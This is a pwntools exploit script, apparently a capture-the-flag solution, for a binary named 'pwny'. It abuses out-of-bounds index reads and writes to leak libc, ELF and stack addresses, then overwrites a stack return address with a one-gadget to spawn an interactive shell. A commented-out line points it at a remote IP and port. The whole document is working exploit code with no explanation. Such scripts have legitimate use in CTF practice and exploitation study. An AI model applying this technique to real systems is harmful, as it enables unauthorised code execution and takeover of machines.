from os import environ
from pwn import *
context(arch = "amd64", os = "Linux", log_level = "Debug")
io = process("./pwny")
# io = remote("124.70.130.92", 60001)
gdb.attach(io)

s       = lambda data               :io.send(data)
sa      = lambda delim,data         :io.sendafter(str(delim), data)
sl      = lambda data               :io.sendline(data)
sla     = lambda delim,data         :io.sendlineafter(str(delim), data)
r       = lambda num=4096           :io.recv(num)
ru      = lambda delims             :io.recvuntil(delims)
rl      = lambda                    :io.recvline()
itr     = lambda                    :io.interactive()
uu32    = lambda data               :u32(data.ljust(4, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))


def minus(num):
    return 2**64 - num

def read(idx):
    ru("choice: ")
    sl("1")
    ru("Index: ")
    s(p64(idx))
    ru("Result: ")

def write(idx, content):
    ru("choice: ")
    sl("2")
    ru("Index: ")
    sl(str(idx))
    s(content)
    
def exit():
    ru("choice: ")
    sl("3")
#prepare:
ru("choice: ")
sl("2")
ru("Index: ")
sl("256")
ru("choice: ")
sl("2")
ru("Index: ")
sl("256")

#get addr of symbols in libc
read(minus(4))
stderr_addr = int("0x" + rl(), 16)
log.info("stderr addr in libc : " + hex(stderr_addr))
environ_addr = stderr_addr + 0x1a18
onegadget_addr = stderr_addr - 0x36e08a
#get addr of elf
elf_offset = (0x60 - 0x8)
read(minus(elf_offset / 8))
elf_addr = int("0x" + rl(), 16) + elf_offset
log.info("elf_addr addr in libc : " + hex(elf_addr))
# pause()
read((environ_addr - elf_addr) / 8)
stack_addr = int("0x" + rl(), 16) - 0x120
log.info("stack addr is : " + hex(stack_addr))
# pause()
write((stack_addr - elf_addr) / 8, p64(onegadget_addr))
itr()